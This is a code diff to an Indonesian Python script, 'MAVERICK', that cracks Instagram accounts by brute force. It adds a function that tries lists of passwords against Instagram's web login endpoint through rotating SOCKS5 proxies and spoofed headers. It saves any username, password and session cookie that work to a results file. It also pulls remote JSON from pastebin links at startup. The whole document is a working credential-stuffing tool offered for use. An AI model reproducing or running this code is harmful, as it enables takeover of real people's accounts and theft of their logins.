@@ -43,7 +43,8 @@ method, ugentku, iyh = [], [], {}
 reset = "[/]"
 uadia, uadarimu, prox = [], [], []
 sys.stdout.write('\x1b]2; MAVERICK\x07')
-
+HARIS={}
+HARIS1={}
 ###----------[ AUTO CREATE FOLDER ]----------###
 try:os.mkdir("data")
 except:pass
@@ -71,16 +72,18 @@ except:
 	color_rich = "[#00FFFF]"
 	color_table = "#AF00FF"
 
+
+acakrich=random.choice([Z2,H2,K2,B2,U2,N2,O2,P2,J2,A2])
 ###----------[ IP ADDRESS ]----------###
 try:
-	IP = requests.get("http://ip-api.com/json/").json()["query"]
-	negara = requests.get("http://ip-api.com/json/").json()["country"]
-	if "Indonesia" not in negara:
-	   prints(Panel(f"""{P2}this script only work in Indonesia, please search another script""",width=80,padding=(0,6),style=f"{color_table}"))
-	   time.sleep(3);exit()
+    IP = requests.get("http://ip-api.com/json/").json()["query"]
+    negara = requests.get("http://ip-api.com/json/").json()["country"]
+    if "Indonesia" not in negara:
+        prints(Panel(f"""{P2}this script only work in Indonesia, please search another script""",width=80,padding=(0,6),style=f"{color_table}"))
+        time.sleep(3);exit()
 except requests.exceptions.ConnectionError:
-	print(f" {O}•{P} koneksi internet anda bermasalah")
-	time.sleep(3);exit()
+    print(f" {O}•{P} koneksi internet anda bermasalah")
+    time.sleep(3);exit()
 
 ###----------[ PROXIES ]----------###
 try:
@@ -98,7 +101,6 @@ class Instagram:
         self.ses = requests.Session()
         self.ok, self.cp = [], []
         self.id, self.lo = [], 0
-        self.gett()
         ###########self.Rayan = self.ses.get("https://api.countapi.xyz/hit/RayanXD/visits").json()["value"]
         self.menu()
 
@@ -209,13 +211,6 @@ class Instagram:
             print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
             time.sleep(3);exit()
 
-    def gett(self):
-        try:
-            iyh.update(self.ses.get("https://pastebin.com/raw/Q7Lqe7s9").json())
-        except requests.ConnectionError:
-            self.logoo()
-            print(f" {O}•{N} {M}Koneksi Internet Anda Bermasalah")
-            time.sleep(3);exit()
 
     def cook(self, tok, cok):
         try:
@@ -674,7 +669,7 @@ class Instagram:
             post = "-"
         return peng, meng, post
 
-    def crakersAPI(self, user, pasw):
+    def crakersAPIm(self, user, pasw):
         prog.update(des,description=f"[{H2} lite.instagram.com {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
         prog.advance(des)
         for password in pasw:
@@ -827,6 +822,87 @@ class Instagram:
                    self.crackXC(self, user, pasw)
         self.lo+=1
 
+    def crakersAPI(self,user,pasw):
+        global loop,success,checkpoint
+        ses=requests.Session()
+        ua=self.ua_ig()
+        warna = random.choice([M, H, K, O,])
+        prog.update(des,description=f"[{H2} ajak.instagram.com {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")
+        prog.advance(des)
+        try:
+            for pw in pasw:
+                ncek=random.randint(1000000000, 99999999999)
+                prx=random.choice(prox)
+                xxx={"http": f"socks5://{prx}"}
+                p = ses.get('https://www.instagram.com/api/v1/web/login_page/')
+                head={
+                    'Host':'www.instagram.com',
+                    'connection':'keep-alive',
+                    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                    'X-IG-App-ID': '1217981644879628',
+                    'X-IG-WWW-Claim': '0',
+                    'sec-ch-ua-mobile': '?1',
+                    'X-Instagram-AJAX': '1006912399',
+                    'User-Agent': ua,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'accept':'*/*',
+                    'X-Requested-With': 'XMLHttpRequest',
+                     'X-ASBD-ID': '198387',
+                     'x-csrftoken':p.cookies['csrftoken'],
+                     'sec-ch-prefers-color-scheme': 'light',
+                     'sec-ch-ua-platform': '"Android"',
+                     'Origin':'https://www.instagram.com',
+                     'Sec-Fetch-Site':'same-origin',
+                     'Sec-Fetch-Mode':'cors',
+                     'Sec-Fetch-Dest':'empty',
+                     'Referer':'https://www.instagram.com/accounts/login/?source=reset_password',
+                     'Accept-Encoding': 'gzip, deflate, br',
+                     'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+                data = {
+           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ncek}:{pw}",
+			"username": user,
+			"queryParams": {},
+			"optIntoOneTap": False,
+			"trustedDeviceRecords": {}}
+                respon=ses.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", headers=head,data=data,proxies=xxx)
+                haris=json.loads(respon.text)
+                if "userId" in str(haris) or "sessionid" in ses.cookies.get_dict():
+                    cokis = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
+                    pengikut, mengikut, postingan = self.Ingfo(user)
+                    print("\r                                       ")
+                    adit = f'\rUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {ua}\nCookie    : {cokis}'
+                    pepekXD = Panel(adit, style=f'#00FFFF')
+                    print('\n')
+                    os.popen('play-audio ok.mp3')
+                    prints(Panel(pepekXD,style='',title=f'\r{H2}ig'))
+                    kntl = (f"[✓] {user}|{pw}|{pengikut}|{mengikut}|{postingan}")
+                    self.ok.append(kntl)
+                    with open("results/"+akunOK,"a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+                elif "checkpoint_url" in str(haris):
+                    checkpoint.append(user)
+                    pengikut,mengikut,postingan=self.Ingfo(user)
+                    print("\r                                       ")
+                    adit = f'\rUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {ua}'
+                    pepekXD = Panel(adit, style=f'#FFFF00')
+                    print('\n')
+                    os.popen('play-audio cp.mp3')
+                    prints(Panel(pepekXD,style='',title=f'\r{N2}ig'))
+                    self.ok.append(kntl)
+                    with open("results/"+akunOK,"a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+                elif 'ip_block' in str(respon.text):
+                    prog.update(des,description=f"[{M2} ig {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{N2}{len(self.cp)}{P2}")          
+                    prog.advance(des)
+                    time.sleep(10)
+
+            self.lo+=1
+        except requests.ConnectionError:
+            time.sleep(10)
+		#except Exception as e:prints(e)
+
     def Ngocok(self, user, pasw):
         ses=requests.Session()
         logtemp=0
@@ -913,14 +989,18 @@ def logoku():
 \t╚═══╩══╩═══╩═══╩╝─╚═╩═══╩══╝""",title="Selamat Datang",width=80,padding=(0,4),style=f"{color_table}"))
                                              
 if __name__=='__main__':
-  try:os.system("git pull") 
-  except:pass
-  try:os.system('pkg install play-audio')
-  except:pass
-  try: Instagram()
-  except requests.exceptions.ConnectionError:
-     print(f" {H}•{N} koneksi internet anda bermasalah")
-     time.sleep(3);exit() 
-     
-
-
+    try:os.system("git pull") 
+    except:pass
+    try:os.system('pkg install play-audio')
+    except:pass
+    try:
+        ko = ses.get('https://pastebin.com/raw/zDsBKSkW').json()
+        HARIS1.update(ko)
+        ki = ses.get('https://pastebin.com/raw/i6MHYWyd').json()
+        HARIS.update(ki)
+    except Exception as e:
+        prints(e)
+    try:Instagram()
+    except requests.exceptions.ConnectionError:
+        print(f" {H}•{N} koneksi internet anda bermasalah")
+        time.sleep(3);exit() 
